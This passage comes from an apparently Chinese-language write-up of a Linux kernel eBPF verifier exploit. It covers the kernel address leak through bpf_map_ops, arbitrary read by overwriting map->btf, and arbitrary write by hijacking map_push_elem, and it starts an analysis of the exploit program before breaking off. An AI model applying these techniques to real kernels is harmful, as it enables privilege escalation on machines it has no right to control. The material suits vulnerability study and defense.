<p>但根据前面我们的分析，我们可以通过一系列的操作来使得一个寄存器的值绕过<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>的检查，假设我们令<span class="heti-skip"><span class="heti-spacing"> </span>r6<span class="heti-spacing"> </span></span>为<span><span class="heti-spacing"> </span>0x110</span>，但<span class="heti-skip"><span class="heti-spacing"> </span>verifier<span class="heti-spacing"> </span></span>认为其为<span><span class="heti-spacing"> </span>0</span>，那这样如果我们访问 <code>bpf_array.value[0-r6]</code>，<span>verifier<span class="heti-spacing"> </span></span>会认为其访问的是 <code>value[0]</code> 没有问题。而<span class="heti-skip"><span class="heti-spacing"> </span>value<span class="heti-spacing"> </span></span>在结构体中的偏移是<span><span class="heti-spacing"> </span>0x110</span>，所以<span class="heti-skip"><span class="heti-spacing"> </span>-0x110<span class="heti-spacing"> </span></span>就可以访问到结构体的开头，也就是 <code>bpf_map</code> 结构体的内容：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-14-1" id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-14-2" id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map_ops</span><span class="w"> </span><span class="o">*</span><span class="n">ops</span><span class="p">;</span>
<a href="#__codelineno-14-3" id="__codelineno-14-3" name="__codelineno-14-3"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map</span><span class="w"> </span><span class="o">*</span><span class="n">inner_map_meta</span><span class="p">;</span>
<a href="#__codelineno-14-4" id="__codelineno-14-4" name="__codelineno-14-4"></a><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">security</span><span class="p">;</span>
<a href="#__codelineno-14-5" id="__codelineno-14-5" name="__codelineno-14-5"></a><span class="w">    </span><span class="k">enum</span><span class="w"> </span><span class="n">bpf_map_type</span><span class="w"> </span><span class="n">map_type</span><span class="p">;</span>
<a href="#__codelineno-14-6" id="__codelineno-14-6" name="__codelineno-14-6"></a><span class="w">    </span><span class="c1">//....</span>
<a href="#__codelineno-14-7" id="__codelineno-14-7" name="__codelineno-14-7"></a><span class="w">    </span><span class="n">u64</span><span class="w"> </span><span class="n">writecnt</span><span class="p">;</span>
<a href="#__codelineno-14-8" id="__codelineno-14-8" name="__codelineno-14-8"></a><span class="p">}</span>
</code></pre></div>
<p>其中<span class="heti-skip"><span class="heti-spacing"> </span>array<span class="heti-spacing"> </span></span>类型的<span class="heti-skip"><span class="heti-spacing"> </span>map<span class="heti-spacing"> </span></span>的 <code>bpf_map_ops</code> 是一个内核中的常量地址，所以我们可以通过读取<span class="heti-skip"><span class="heti-spacing"> </span>value-0x110<span class="heti-spacing"> </span></span>处的值来泄漏出内核地址。</p>
<h3 id="_2">任意地址读原理<a class="headerlink" href="#_2" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p>任意地址读利用的是<span class="heti-skip"><span class="heti-spacing"> </span>bpf<span class="heti-spacing"> </span></span>系统调用的<span class="heti-skip"><span class="heti-spacing"> </span>BPF_OBJ_GET_INFO_BY_FD<span class="heti-spacing"> </span></span>功能，其内核调用的代码为：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-15-1" id="__codelineno-15-1" name="__codelineno-15-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">bpf_map_get_info_by_fd</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map</span><span class="w"> </span><span class="o">*</span><span class="n">map</span><span class="p">,</span>
<a href="#__codelineno-15-2" id="__codelineno-15-2" name="__codelineno-15-2"></a><span class="w">                  </span><span class="k">const</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="nc">bpf_attr</span><span class="w"> </span><span class="o">*</span><span class="n">attr</span><span class="p">,</span>
<a href="#__codelineno-15-3" id="__codelineno-15-3" name="__codelineno-15-3"></a><span class="w">                  </span><span class="k">union</span><span class="w"> </span><span class="nc">bpf_attr</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">uattr</span><span class="p">)</span>
<a href="#__codelineno-15-4" id="__codelineno-15-4" name="__codelineno-15-4"></a><span class="p">{</span>
<a href="#__codelineno-15-5" id="__codelineno-15-5" name="__codelineno-15-5"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map_info</span><span class="w"> </span><span class="n">__user</span><span class="w"> </span><span class="o">*</span><span class="n">uinfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">u64_to_user_ptr</span><span class="p">(</span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">info</span><span class="p">);</span>
<a href="#__codelineno-15-6" id="__codelineno-15-6" name="__codelineno-15-6"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map_info</span><span class="w"> </span><span class="n">info</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{};</span>
<a href="#__codelineno-15-7" id="__codelineno-15-7" name="__codelineno-15-7"></a><span class="w">    </span><span class="n">u32</span><span class="w"> </span><span class="n">info_len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">attr</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">info_len</span><span class="p">;</span>
<a href="#__codelineno-15-8" id="__codelineno-15-8" name="__codelineno-15-8"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-15-9" id="__codelineno-15-9" name="__codelineno-15-9"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">btf</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-15-10" id="__codelineno-15-10" name="__codelineno-15-10"></a><span class="w">            </span><span class="n">info</span><span class="p">.</span><span class="n">btf_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">btf_id</span><span class="p">(</span><span class="n">map</span><span class="o">-&gt;</span><span class="n">btf</span><span class="p">);</span>
<a href="#__codelineno-15-11" id="__codelineno-15-11" name="__codelineno-15-11"></a><span class="w">            </span><span class="n">info</span><span class="p">.</span><span class="n">btf_key_type_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">map</span><span class="o">-&gt;</span><span class="n">btf_key_type_id</span><span class="p">;</span>
<a href="#__codelineno-15-12" id="__codelineno-15-12" name="__codelineno-15-12"></a><span class="w">            </span><span class="n">info</span><span class="p">.</span><span class="n">btf_value_type_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">map</span><span class="o">-&gt;</span><span class="n">btf_value_type_id</span><span class="p">;</span>
<a href="#__codelineno-15-13" id="__codelineno-15-13" name="__codelineno-15-13"></a><span class="w">        </span><span class="p">}</span>
<a href="#__codelineno-15-14" id="__codelineno-15-14" name="__codelineno-15-14"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-15-15" id="__codelineno-15-15" name="__codelineno-15-15"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">copy_to_user</span><span class="p">(</span><span class="n">uinfo</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">info</span><span class="p">,</span><span class="w"> </span><span class="n">info_len</span><span class="p">)</span><span class="w"> </span><span class="o">||</span>
<a href="#__codelineno-15-16" id="__codelineno-15-16" name="__codelineno-15-16"></a><span class="w">            </span><span class="n">put_user</span><span class="p">(</span><span class="n">info_len</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">uattr</span><span class="o">-&gt;</span><span class="n">info</span><span class="p">.</span><span class="n">info_len</span><span class="p">))</span>
<a href="#__codelineno-15-17" id="__codelineno-15-17" name="__codelineno-15-17"></a><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
<a href="#__codelineno-15-18" id="__codelineno-15-18" name="__codelineno-15-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a href="#__codelineno-15-19" id="__codelineno-15-19" name="__codelineno-15-19"></a><span class="p">}</span>
</code></pre></div>
<p>其中 <code>map-&gt;btf</code> 是一个<span class="heti-skip"><span class="heti-spacing"> </span>BTF<span class="heti-spacing"> </span></span>结构体的指针，而 <code>btf_id</code> 函数是读取这个结构体的<span class="heti-skip"><span class="heti-spacing"> </span>id<span class="heti-spacing"> </span></span>值，而<span class="heti-skip"><span class="heti-spacing"> </span>id<span class="heti-spacing"> </span></span>位于该结构体的<span class="heti-skip"><span class="heti-spacing"> </span>0x58<span class="heti-spacing"> </span></span>偏移处。所以只要我们修改 <code>map-&gt;btf</code> 为<span><span class="heti-spacing"> </span>target-0x58</span>，这样 <code>btf_id</code> 就会访问<span class="heti-skip"><span class="heti-spacing"> </span>target<span class="heti-spacing"> </span></span>处的值。</p>
<p><code>btf_map</code> 这个结构体在前面我们就已经可以根据漏洞来完全访问了，而其中<span class="heti-skip"><span class="heti-spacing"> </span>0x40<span class="heti-spacing"> </span></span>偏移的位置就是<span class="heti-skip"><span class="heti-spacing"> </span>btf<span class="heti-spacing"> </span></span>指针，所以我们在前面泄漏<span class="heti-skip"><span class="heti-spacing"> </span>ops<span class="heti-spacing"> </span></span>的基础上加<span class="heti-skip"><span class="heti-spacing"> </span>0x40<span class="heti-spacing"> </span></span>并覆盖为<span class="heti-skip"><span class="heti-spacing"> </span>target-0x58<span class="heti-spacing"> </span></span>就可以修改 <code>map-&gt;btf</code> 了。而在函数的的末尾，会将访问的结果拷贝到用户空间，其中 <code>btf_id</code> 字段在 <code>bpf_map_info</code> 结构体的<span class="heti-skip"><span class="heti-spacing"> </span>0x40<span class="heti-spacing"> </span></span>偏移处，所以在我们得到结果后，其<span class="heti-skip"><span class="heti-spacing"> </span>0x40<span class="heti-spacing"> </span></span>位置处就是我们想要访问的<span class="heti-skip"><span class="heti-spacing"> </span>target<span class="heti-spacing"> </span></span>地址处的值，也就实现了任意地址读。</p>
<h3 id="_3">任意地址写原理<a class="headerlink" href="#_3" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p>既然我们可以任意修改 <code>bpf_map</code> 结构体中的值，所以我们也可以劫持 <code>bpf_map_ops</code>，覆盖这个指针，就可以让内核在调用其中函数的时候调用到我们构造的其他函数指针的地址。然后我们想办法通过调用来进行任意地址写就可以了。</p>
<p>我们选择使用<span class="heti-skip"><span class="heti-spacing"> </span>stack<span class="heti-spacing"> </span></span>类型的<span><span class="heti-spacing"> </span>map</span>，这样就可以通过 <code>bpf_update_elem</code> 调用到 <code>map_update_elem</code> 函数，然后从<span class="heti-skip"><span class="heti-spacing"> </span>ops<span class="heti-spacing"> </span></span>中取出 <code>map_push_elem</code> 函数指针来调用，我们就可以更改 <code>map_push_elem</code> 位置上的指针指，使其调用到 <code>map_get_next_key</code> 函数。</p>
<p>为了将<span class="heti-skip"><span class="heti-spacing"> </span>map<span class="heti-spacing"> </span></span>改为<span class="heti-skip"><span class="heti-spacing"> </span>stack<span class="heti-spacing"> </span></span>类型，我们也是直接修改 <code>bpf_map</code> 结构体的内容即可，我们需要修改：</p>
<ul>
<li><span>0x18<span class="heti-spacing"> </span></span>偏移上的 <code>map_type</code>，修改为<span><span class="heti-spacing"> </span>BPF_MAP_TYPE_STACK</span></li>
<li><span>0x24<span class="heti-spacing"> </span></span>偏移上的 <code>max_entries</code>，修改为<span><span class="heti-spacing"> </span>0xffffffff</span>，即<span><span class="heti-spacing"> </span>-1</span></li>
<li><span>0x2c<span class="heti-spacing"> </span></span>偏移上的 <code>spin_lock_off</code>，修改为<span><span class="heti-spacing"> </span>0</span></li>
</ul>
<p>然后劫持<span class="heti-skip"><span class="heti-spacing"> </span>ops<span class="heti-spacing"> </span></span>指针，覆盖其中的 <code>map_push_elem</code> 元素为 <code>map_get_next_key</code> 函数指针：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-16-1" id="__codelineno-16-1" name="__codelineno-16-1"></a><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map_ops</span><span class="w"> </span><span class="n">stack_map_ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-16-2" id="__codelineno-16-2" name="__codelineno-16-2"></a><span class="w">    </span><span class="p">.</span><span class="n">map_alloc_check</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">queue_stack_map_alloc_check</span><span class="p">,</span>
<a href="#__codelineno-16-3" id="__codelineno-16-3" name="__codelineno-16-3"></a><span class="w">    </span><span class="p">.</span><span class="n">map_alloc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">queue_stack_map_alloc</span><span class="p">,</span>
<a href="#__codelineno-16-4" id="__codelineno-16-4" name="__codelineno-16-4"></a><span class="w">    </span><span class="p">.</span><span class="n">map_free</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">queue_stack_map_free</span><span class="p">,</span>
<a href="#__codelineno-16-5" id="__codelineno-16-5" name="__codelineno-16-5"></a><span class="w">    </span><span class="p">.</span><span class="n">map_lookup_elem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">queue_stack_map_lookup_elem</span><span class="p">,</span>
<a href="#__codelineno-16-6" id="__codelineno-16-6" name="__codelineno-16-6"></a><span class="w">    </span><span class="p">.</span><span class="n">map_update_elem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">queue_stack_map_update_elem</span><span class="p">,</span>
<a href="#__codelineno-16-7" id="__codelineno-16-7" name="__codelineno-16-7"></a><span class="w">    </span><span class="p">.</span><span class="n">map_delete_elem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">queue_stack_map_delete_elem</span><span class="p">,</span>
<a href="#__codelineno-16-8" id="__codelineno-16-8" name="__codelineno-16-8"></a><span class="w">    </span><span class="p">.</span><span class="n">map_push_elem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">queue_stack_map_push_elem</span><span class="p">,</span><span class="w">  </span><span class="c1">// 修改为 map_get_next_key</span>
<a href="#__codelineno-16-9" id="__codelineno-16-9" name="__codelineno-16-9"></a><span class="w">    </span><span class="p">.</span><span class="n">map_pop_elem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stack_map_pop_elem</span><span class="p">,</span>
<a href="#__codelineno-16-10" id="__codelineno-16-10" name="__codelineno-16-10"></a><span class="w">    </span><span class="p">.</span><span class="n">map_peek_elem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">stack_map_peek_elem</span><span class="p">,</span>
<a href="#__codelineno-16-11" id="__codelineno-16-11" name="__codelineno-16-11"></a><span class="w">    </span><span class="p">.</span><span class="n">map_get_next_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">queue_stack_map_get_next_key</span><span class="p">,</span>
<a href="#__codelineno-16-12" id="__codelineno-16-12" name="__codelineno-16-12"></a><span class="p">};</span>
</code></pre></div>
<p>然后在执行 <code>map_get_next_key</code> 函数时，会发生内存的写入：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-17-1" id="__codelineno-17-1" name="__codelineno-17-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">array_map_get_next_key</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map</span><span class="w"> </span><span class="o">*</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">next_key</span><span class="p">)</span>
<a href="#__codelineno-17-2" id="__codelineno-17-2" name="__codelineno-17-2"></a><span class="p">{</span>
<a href="#__codelineno-17-3" id="__codelineno-17-3" name="__codelineno-17-3"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_array</span><span class="w"> </span><span class="o">*</span><span class="n">array</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">container_of</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_array</span><span class="p">,</span><span class="w"> </span><span class="n">map</span><span class="p">);</span>
<a href="#__codelineno-17-4" id="__codelineno-17-4" name="__codelineno-17-4"></a><span class="w">    </span><span class="n">u32</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">key</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="o">*</span><span class="p">(</span><span class="n">u32</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="n">U32_MAX</span><span class="p">;</span>
<a href="#__codelineno-17-5" id="__codelineno-17-5" name="__codelineno-17-5"></a><span class="w">    </span><span class="n">u32</span><span class="w"> </span><span class="o">*</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">u32</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">next_key</span><span class="p">;</span>
<a href="#__codelineno-17-6" id="__codelineno-17-6" name="__codelineno-17-6"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">index</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">array</span><span class="o">-&gt;</span><span class="n">map</span><span class="p">.</span><span class="n">max_entries</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>\
<a href="#__codelineno-17-7" id="__codelineno-17-7" name="__codelineno-17-7"></a><span class="w">        </span><span class="o">*</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a href="#__codelineno-17-8" id="__codelineno-17-8" name="__codelineno-17-8"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a href="#__codelineno-17-9" id="__codelineno-17-9" name="__codelineno-17-9"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-17-10" id="__codelineno-17-10" name="__codelineno-17-10"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">index</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">array</span><span class="o">-&gt;</span><span class="n">map</span><span class="p">.</span><span class="n">max_entries</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<a href="#__codelineno-17-11" id="__codelineno-17-11" name="__codelineno-17-11"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">-</span><span class="n">ENOENT</span><span class="p">;</span>
<a href="#__codelineno-17-12" id="__codelineno-17-12" name="__codelineno-17-12"></a><span class="w">    </span><span class="o">*</span><span class="n">next</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="c1">// *(u32 *)next_key = *(u32 *)key + 1</span>
<a href="#__codelineno-17-13" id="__codelineno-17-13" name="__codelineno-17-13"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<a href="#__codelineno-17-14" id="__codelineno-17-14" name="__codelineno-17-14"></a><span class="p">}</span>
</code></pre></div>
<p>修改 <code>max_entries</code> 和 <code>spin_lock_off</code> 是为了能正常执行到函数最后，在最后根据分析，会进行内存写，即取出第一个参数的<span class="heti-skip"><span class="heti-spacing"> </span>u32<span class="heti-spacing"> </span></span>值加上<span class="heti-skip"><span class="heti-spacing"> </span>1<span class="heti-spacing"> </span></span>再存到第二个参数的位置处。我们执行到此的调用链为：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-18-1" id="__codelineno-18-1" name="__codelineno-18-1"></a><span class="n">bpf_update_elem</span><span class="p">(</span><span class="n">mapfd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span>
<a href="#__codelineno-18-2" id="__codelineno-18-2" name="__codelineno-18-2"></a><span class="o">-&gt;</span><span class="w"> </span><span class="n">map_update_elem</span><span class="p">(</span><span class="n">mapfd</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span>
<a href="#__codelineno-18-3" id="__codelineno-18-3" name="__codelineno-18-3"></a><span class="o">-&gt;</span><span class="w"> </span><span class="n">map_push_elem</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map</span><span class="w"> </span><span class="o">*</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="n">u64</span><span class="w"> </span><span class="n">flags</span><span class="p">)</span>
<a href="#__codelineno-18-4" id="__codelineno-18-4" name="__codelineno-18-4"></a><span class="w">    </span><span class="err">（</span><span class="n">实际上劫持后是</span><span class="w"> </span><span class="n">map_get_next_key</span><span class="err">）</span>
<a href="#__codelineno-18-5" id="__codelineno-18-5" name="__codelineno-18-5"></a><span class="o">-&gt;</span><span class="w"> </span><span class="n">array_map_get_next_key</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_map</span><span class="w"> </span><span class="o">*</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">key</span><span class="p">,</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">next_key</span><span class="p">)</span><span class="w"> </span>
</code></pre></div>
<p>所以对应起来，我们传入的<span class="heti-skip"><span class="heti-spacing"> </span>value<span class="heti-spacing"> </span></span>就是最后的<span><span class="heti-spacing"> </span>key</span>，<span>flags<span class="heti-spacing"> </span></span>就是最后的<span><span class="heti-spacing"> </span>next_key</span>，所以我们构造<span class="heti-skip"><span class="heti-spacing"> </span>value<span class="heti-spacing"> </span></span>和<span class="heti-skip"><span class="heti-spacing"> </span>flags<span class="heti-spacing"> </span></span>就可以实现 <code>*(u32*)flags = *(u32*)value + 1</code> 的写入，而这些都是我们可控的用户输入，所以就可以实现任意地址写。</p>
<h3 id="exp"><span>exp<span class="heti-spacing"> </span></span>程序分析<a class="headerlink" href="#exp" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h3>
<p>首先需要创建一些<span class="heti-skip"><span class="heti-spacing"> </span>map<span class="heti-spacing"> </span></span>并加载<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-19-1" id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">prep</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-19-2" id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="w">    </span><span class="n">ctrl_mapfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span><span class="w"> </span><span class="mh">0x100</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a href="#__codelineno-19-3" id="__codelineno-19-3" name="__codelineno-19-3"></a><span class="w">    </span><span class="n">exp_mapfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span><span class="w"> </span><span class="mh">0x2000</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a href="#__codelineno-19-4" id="__codelineno-19-4" name="__codelineno-19-4"></a><span class="w">    </span><span class="n">progfd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">load_my_prog</span><span class="p">();</span>
<a href="#__codelineno-19-5" id="__codelineno-19-5" name="__codelineno-19-5"></a><span class="w">    </span><span class="p">...</span>
<a href="#__codelineno-19-6" id="__codelineno-19-6" name="__codelineno-19-6"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span><span class="w"> </span><span class="n">SOCK_DGRAM</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">sockets</span><span class="p">)){</span>
<a href="#__codelineno-19-7" id="__codelineno-19-7" name="__codelineno-19-7"></a><span class="w">        </span><span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<a href="#__codelineno-19-8" id="__codelineno-19-8" name="__codelineno-19-8"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-19-9" id="__codelineno-19-9" name="__codelineno-19-9"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">SOL_SOCKET</span><span class="p">,</span><span class="w"> </span><span class="n">SO_ATTACH_BPF</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">progfd</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">progfd</span><span class="p">))</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">){</span>
<a href="#__codelineno-19-10" id="__codelineno-19-10" name="__codelineno-19-10"></a><span class="w">        </span><span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
<a href="#__codelineno-19-11" id="__codelineno-19-11" name="__codelineno-19-11"></a><span class="w">    </span><span class="p">}</span>
<a href="#__codelineno-19-12" id="__codelineno-19-12" name="__codelineno-19-12"></a><span class="p">}</span>
<a href="#__codelineno-19-13" id="__codelineno-19-13" name="__codelineno-19-13"></a>
<a href="#__codelineno-19-14" id="__codelineno-19-14" name="__codelineno-19-14"></a><span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">load_my_prog</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-19-15" id="__codelineno-19-15" name="__codelineno-19-15"></a><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_insn</span><span class="w"> </span><span class="n">my_prog</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<a href="#__codelineno-19-16" id="__codelineno-19-16" name="__codelineno-19-16"></a><span class="w">        </span><span class="p">...</span><span class="w"> </span><span class="c1">// eBPF 程序字节码</span>
<a href="#__codelineno-19-17" id="__codelineno-19-17" name="__codelineno-19-17"></a><span class="w">    </span><span class="p">};</span>
<a href="#__codelineno-19-18" id="__codelineno-19-18" name="__codelineno-19-18"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span><span class="w"> </span><span class="n">my_prog</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">my_prog</span><span class="p">),</span><span class="w"> </span><span class="s">"GPL"</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
<a href="#__codelineno-19-19" id="__codelineno-19-19" name="__codelineno-19-19"></a><span class="p">}</span>
</code></pre></div>
<p>创建的<span class="heti-skip"><span class="heti-spacing"> </span>ctrl_map<span class="heti-spacing"> </span></span>用于作为对程序的传参，<span>exp_map<span class="heti-spacing"> </span></span>用于实际利用。在加载程序后，通过<span class="heti-skip"><span class="heti-spacing"> </span>socketpair<span class="heti-spacing"> </span></span>创建<span><span class="heti-spacing"> </span>socket</span>，通过<span class="heti-skip"><span class="heti-spacing"> </span>setsockopt<span class="heti-spacing"> </span></span>将<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序加载到<span class="heti-skip"><span class="heti-spacing"> </span>socket<span class="heti-spacing"> </span></span>上，这样后续就可以通过对<span class="heti-skip"><span class="heti-spacing"> </span>socket[0]<span class="heti-spacing"> </span></span>的<span class="heti-skip"><span class="heti-spacing"> </span>write<span class="heti-spacing"> </span></span>触发<span class="heti-skip"><span class="heti-spacing"> </span>eBPF<span class="heti-spacing"> </span></span>程序运行：</p>
<div class="highlight"><pre><span></span><code><a href="#__codelineno-20-1" id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">execute</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
